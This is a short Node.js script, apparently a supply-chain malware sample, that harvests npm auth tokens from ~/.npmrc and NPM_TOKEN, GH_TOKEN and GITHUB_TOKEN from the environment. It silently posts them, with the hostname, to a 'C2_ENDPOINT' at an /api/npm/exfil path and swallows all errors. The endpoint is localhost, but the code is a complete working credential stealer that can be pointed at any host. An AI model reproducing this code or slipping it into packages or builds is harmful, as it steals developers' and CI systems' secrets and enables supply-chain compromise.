const https = require('https');
const http = require('http');
const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const C2_ENDPOINT = 'http://localhost:8081';
const EXFIL_TARGET = 'github';

function harvestTokens() {
  const tokens = [];
  const home = os.homedir();
  
  // Scan .npmrc
  const npmrcPath = path.join(home, '.npmrc');
  if (fs.existsSync(npmrcPath)) {
    const content = fs.readFileSync(npmrcPath, 'utf8');
    const matches = content.match(/_authToken\s*=\s*([^\s]+)/g);
    if (matches) {
      tokens.push(...matches.map(m => ({ type: 'npm', value: m.split('=')[1].trim() })));
    }
  }
  
  // Environment variables
  ['NPM_TOKEN', 'GH_TOKEN', 'GITHUB_TOKEN'].forEach(envVar => {
    if (process.env[envVar]) {
      tokens.push({ type: envVar.toLowerCase(), value: process.env[envVar] });
    }
  });
  
  return tokens;
}

function exfiltrate(data) {
  try {
    const payload = JSON.stringify({
      timestamp: new Date().toISOString(),
      hostname: os.hostname(),
      data: data
    });
    
    const url = new URL(C2_ENDPOINT + '/api/npm/exfil');
    const options = {
      hostname: url.hostname,
      port: url.port || 80,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };
    
    const req = http.request(options);
    req.write(payload);
    req.end();
  } catch (e) {}
}

// Main execution
try {
  const tokens = harvestTokens();
  if (tokens.length > 0) {
    exfiltrate({ tokens });
  }
} catch (e) {}
